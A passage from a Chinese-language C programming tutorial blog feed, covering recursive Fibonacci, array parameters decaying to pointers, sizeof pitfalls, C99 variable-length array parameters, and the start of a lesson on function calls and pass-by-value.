2);</code>这一条语句.</p><p>显然,这两个调用仍然是<code>fibonacci()</code>这个函数,只不过调用时使用的值不同而已.我们发现,每次在<code>fibonacci()</code>中调用自己,传递的参数不是<code>n-1</code>就是<code>n-2</code>,这样就保证最终在某一层的调用中,n的值减少到了1或者2,此时函数直接返回,不再需要进一步的递归.</p><p>到了这步,函数便逐层地结束,一层层地将运算的值返回给<code>上一层</code>,由上一层将这层的两次调用函数的返回值相加,把结果返回给再上一层,直到最终返回到顶层,即原来要求解的n.</p><p>最终,所有的递归调用的运算结果都汇总到一个<code>fibonacci()</code>的调用,也就是main()函数一开始调用的那一个,然后其再次返回相加的值(当然,如果n一开始就是1或者2,则根本不会有这么多的递归过程),赋值给main中的result变量.</p><br><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231108204235065.png" alt="image-20231108204235065" style="zoom:50%;" /><p>斐波那契的递归求解就是如此简单,只需要短短的3行即可.</p><br><p>我们使用CLion在<code>return 1;</code>下断点进行调试也能发现,函数逐层递归,直到最底层的(逻辑上的底层,实际的栈顶)一次调用结束,才能返回到上一层继续运行:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231108204119666.png" alt="image-20231108204119666" style="zoom:50%;" /><p>当n为5时,实际上的<code>调用过程</code>类似这样:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231205172718566.png" alt="image-20231205172718566" style="zoom:50%;" /><p>其中箭头上的数字代表函数调用的顺序,例如第一个调用就是main()调用fibonacci(),此时n为5.</p><p>可以看到,return语句的表达式中有2个递归调用,所以<code>调用链</code>看起来就像是一个<code>二叉树</code>一样.</p><h1 id="c函数与数组">C函数与数组</h1><h2 id="可以数组作为参数">可以数组作为参数?</h2><h3 id="先上结论">先上结论</h3><p><code>这是一个新手非常容易犯错的问题</code>.十分明确的一点是,C语言中无论是<code>函数参数</code>还是<code>函数返回值</code>,都只能对应一个一般的变量,而不能将一个<code>数组</code>作为一个整体进行参数传递.</p><p>尽管我们某种程度上认为数组是&quot;一个&quot;变量(在后面讲解指针和数组的关系时会详细描述)—只不过被划分为各个子元素.但是C语言并没有提供一种方法,用以实现将整个数组作为参数进行传递,或者是将一个数组作为返回值进行返回.</p><p>而这一点看起来十分冲突,特别是在我们后面学习了结构体后这一问题会尤为突出.一种理解方式是,结构体的各个字段并不是单一的变量,而是作为结构体的一部分,一个结构体变量此时作为一个整体被视为一个单一的变量.</p><h3 id="使用数组作为形参">使用数组作为形参</h3><p>尽管我们不能将一整个数组作为参数复制过去,但是我们仍然可以为函数制定一个数组形式的参数,但是这个参数很特殊.</p><p>我们看一个代码,这个程序用于输出某个数组的所有元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr2[<span class="number">10</span>])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    print_arr(arr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231111143707285.png" alt="image-20231111143707285" style="zoom:50%;" /><p>上面这个程序读起来十分容易,看上去<code>print_arr()</code>接受了一个&quot;数组参数&quot;,然后将每一个元素进行输出.</p><br><p>但是下面的代码就会让你发现,对函数形参arr2的&quot;各个元素&quot;进行修改是会影响到main中的arr的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr2[<span class="number">10</span>])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;change arr2 in print_arr\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        arr2[i] *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arr2 in print_arr:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arr in main:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call print_arr():\n&quot;</span>);</span><br><span class="line">    print_arr(arr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after call print_arr(),arr in main:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231111151641994.png" alt="image-20231111151641994" style="zoom:50%;" /><p>显然我们可以看到main()函数中的arr数组<code>也受到了影响</code>.</p><br><p>上面的例子中可以看出,数组作为函数形参,并不会为整个数组生成一个副本(如果不理解请回看<code>函数参数的按值传递</code>),而是会以某种方式将实参&quot;映射&quot;过来,这就意味着在print_arr()中对形参arr各元素的修改,实际上修改的是main()函数中的数组arr的各元素.</p><p>事实上,print_arr()中根本就没有一个新的数组,仅仅是存在一个<code>指向arr数组首元素的指针</code>,这个指针就是arr2!</p><p>这里简单地抛出这个重要区别,读者一定注意!这和一般的参数不同.</p><br><p>想要解释这个问题,需要后续学习指针后才能进行讨论,这里可以记住:<code>对于函数形参而言,传递数组就是在传递指针,而不是复制整个数组</code>.</p><h3 id="数组的长度信息">数组的长度信息</h3><p>还有一个重要的事情,我们知道利用sizeof()可以计算数组的大小:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="keyword">sizeof</span>(arr)/<span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,len); <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即<code>sizeof(arr)</code>计算出arr数组的总长度(字节数),然后除以arr每一个元素的长度<code>sizeof(arr[0])</code>,就算出了数组的大小(元素个数)<code>len</code>.</p><br><p>但是放到函数参数这里就不再成立:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_arr_len</span><span class="params">(<span class="type">int</span> arr2[<span class="number">10</span>])</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="keyword">sizeof</span>(arr2) / <span class="keyword">sizeof</span>(arr2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = get_arr_len(arr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len); <span class="comment">// 运行结果是错误的 2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原因很简单,函数形参arr2实际上是一个指针,而不是数组.</p><p>x64(我的环境是64位)的指针变量(int*)占用8个字节,而每一个元素(int)占用4个字节,两者相除结果就是2.</p><p>这就导致结果是错误的,所以,我们在对一个函数传递一个数组时,需要手动使用另外一个变量去传递数组的长度.</p><p>另一方面,尽管我们写了<code>int arr2[10]</code>,但是这里的<code>10</code>被直接无视(实际上其可以被省略).原因一样,arr2只是一个指针.</p><br><p>我们要写一个函数输出一个数组的所有元素,但事先不知道其长度,可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如上所述,这里直接将10省略掉,使用另外一个形参len手动指定</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr2[],<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    print_arr(arr,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231111153149707.png" alt="image-20231111153149707" style="zoom:50%;" /><h2 id="可以返回一个数组">可以返回一个数组?</h2><p>和数组形参同理,返回值也是不可能返回一个完整的数组副本的.同样,如果写<code>return arr2;</code>,返回的将是一个指针.</p><p>而且提前告知一句:返回一个指针的函数,一定要确保指针不为NULL,或者没有指向某些意想不到的地方,例如该函数的某个局部变量,在函数返回后这个局部变量就被销毁了!</p><p><code>指针</code>,<code>指针与数组的关系</code>比较复杂,会在后面进行讲解.</p><h2 id="c99-变长数组形式参数">C99-变长数组形式参数</h2><h3 id="变长数组-vla">变长数组(VLA)</h3><p>前面讲解数组时提到,数组变量的长度必须使用<code>常量表达式</code>给出,而在新标准C99中(其实已经不新,写这篇文章时已经更新到C23),也可以使用非常量表达式.这样的数组叫做<code>变长数组(VLA)</code>.</p><p>我们使用<code>变长数组</code>可以自定义数组的长度,而不是必须进行<code>动态内存分配</code>.</p><p>下面是一个例子,用于存储并输出1~n:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 存储并输出1~n</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        arr[i] = i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变长数组函数形参">变长数组函数形参</h3><p>C99同时增加了几个与数组型参数相关的特性.</p><p>VLA作为函数形参,往往用于传递高维数组,因为高维数组必须确定第1维之后的各维的长度.</p><p>我们在传递二维数组形参时,可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 第二维不可省略!,第一维,即需要输出几行,显式地使用另外一个参数给出</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">print_arr2d</span><span class="params">(<span class="type">int</span> arr[][<span class="number">4</span>],<span class="type">int</span> row)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;row;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">3</span>][<span class="number">4</span>]=&#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    print_arr2d(arr,<span class="number">3</span>); <span class="comment">// 输出这个二维数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是一旦main()中的数组列数发生变化,例如变成了5,程序就会发生错误.</p><p>C99的变长数组函数形参解决了这个问题,我们可以这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// row和col两个参数必须在arr之前给出</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">print_arr2d</span><span class="params">(<span class="type">int</span> row, <span class="type">int</span> col, <span class="type">int</span> arr[row][col])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; col; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">1</span>, <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>&#125;,</span><br><span class="line">            &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    print_arr2d(<span class="number">3</span>, <span class="number">4</span>, arr); <span class="comment">// 这样写的话,print_arr2d()函数即可适用于任何大小的二维数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>本部分讲解了初学者能遇到的大部分函数问题,不过二维数组参数仍然没有讲解清楚,我会将相关的所有内容放到指针这一大篇章.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../2023def693eb5bf8">C语言教程-12_2-深入分析函数和面向过程初识</a></p><p>下一篇:<a href="../202310666f346238">C语言教程-13_1-初识指针</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-12_2-深入分析函数和面向过程初识</title>
      <link href="/2023def693eb5bf8/"/>
      <url>/2023def693eb5bf8/</url>
      
        <content type="html"><![CDATA[<p>提要:</p><ol><li>分析C函数的调用过程与参数传递</li><li>分析函数声明与定义的区别</li><li>分析C函数与数学函数的区别</li><li>了解面向过程</li></ol><p>前置知识:</p><ol><li>了解C函数的基本结构</li></ol><p>注:尽管看起来过度分块,但是为了更加清晰地突出内容,还是分出了许多的标题,望理解.</p><h1 id="深入分析c函数">深入分析C函数</h1><h2 id="c函数的调用过程">C函数的调用过程</h2><p>上一部分已经讲解了C函数的基本结构,即:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;返回值类型&gt; &lt;标识符(函数名)&gt;(形参列表)&#123;</span><br><span class="line">    <span class="comment">// 代码块</span></span><br><span class="line">    <span class="keyword">return</span> 返回值; <span class="comment">// 可选的return 语句.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且知道在一个函数A中调用一个函数B(假设B的声明是这样:<code>int B(int a);</code>)只需要这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 其它代码</span></span><br><span class="line">    <span class="type">int</span> a2 = B(<span class="number">3</span>); <span class="comment">// 向B传递一个3作为实参,返回一个int值赋值给a2</span></span><br><span class="line">    <span class="comment">// 其它代码</span></span><br><span class="line">    <span class="comment">// A返回值为void,所以不需要返回任何值,我们将会在后面讲解到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面来详细讲解.</p><h3 id="使用函数-函数调用-主调函数与被调函数">使用函数-函数调用,主调函数与被调函数</h3><p>仍然是使用计算平方的这个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2;</span><br><span class="line">    x2 = f(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>函数调用</p><p>我们前面仅仅是定义了一个函数f,和数学一样,我们需要使用特定的<code>参数</code>(自变量)去使用f进行求值.</p><p>调用一个函数,需要使用到函数调用表达式,只需要使用要调用的函数名,并在后面跟一个小括号,里面按顺序填写需要传递的特定参数:<code>&lt;函数名&gt;(需要传递的参数列表)</code></p><p>例如在main()函数中,第11行<code>x2 = f(x);</code>这条语句中,就调用了f(x),用于求x的平方,并且直接将<code>f(x)</code>赋值给x2,因为函数表达式的值就是这个函数的<code>返回值</code>.</p></li><li><p>主调函数与被调函数</p><p>这是两个概念,需要了解.</p><p><code>主调函数</code>就是调用的发起者,也就是<code>调用方</code>.这里就是main()函数,他调用了f()函数.</p><p>被调函数就是被调用的一方,也就是<code>被调用方</code>,这里就是f()函数,因为他被main()函数调用了.</p></li><li><p>函数调用的位置</p><p>函数调用可以出现在主调函数任何需要使用值的位置,前提是被调函数有返回值—如果一个函数的返回值为<code>void</code>,那么他没有返回值.</p><p>例如,我们可以直接将f(x)传递给printf(),而无需多此一举赋值给x2:</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,f(x)); <span class="comment">// 没有任何必要再引入一个x2来浪费时间和空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然,在调用一个函数并使用其值时,一定要注意参数类型和返回值类型的匹配!否则可能引发报错,甚至更严重的是,导致一些意想不到的结果.</p></li></ul><h3 id="参数问题-形参和实参">参数问题-形参和实参</h3><p>接下来就要讨论一个重要问题,即函数的参数.</p><p>我们可以看到,在main()函数中,函数调用是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x2 = f(x);</span><br></pre></td></tr></table></figure><p>但是我们看f(x)的声明(函数声明即仅给出函数头,并在最后加上;):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>;</span><br></pre></td></tr></table></figure><p>可以看到有两个<code>x</code>,事实上这两个x并不是一个东西.</p><p><code>int x2 = f(x);</code>中的x,是main()函数中的局部变量,我们仅仅是将这个x的值作为参数传递(复制其值)给f().这里的x叫做<code>实际参数(实参)</code>,也就是真正的参数值.</p><p><code>int f(int x);</code>中的x,是为了指明f()函数的一个参数,它配合着函数体中的代码,来构成一个完整的函数,自身并没有值,需要主调函数为其传递一个特定值.这个x叫做形式参数(形参),它需要等待传入一个实参值并复制给他.</p><p>这里我们就可以大胆猜测(事实上前面已经有代码这么做),调用f()的时候,实参列表中的各个实参完全不必要和形参名一一对应,<code>我们仅仅关心实参的值</code>!</p><p>这就又牵扯出一个关键点:<code>C函数的一切参数传递全部都是按值传递!</code></p><p>下面进行讲解:</p><h3 id="按值传递">按值传递</h3><p>考虑一个问题,如果我在f()中对形参x进行修改,那么main()中的实参x(或者是任何变量)的值会不会同步地发生变化?看代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">x++;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">10</span>, x2;</span><br><span class="line">x2 = f(x);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%d,x2=%d&quot;</span>, x, x2);</span><br><span class="line"><span class="keyword">return</span> <span 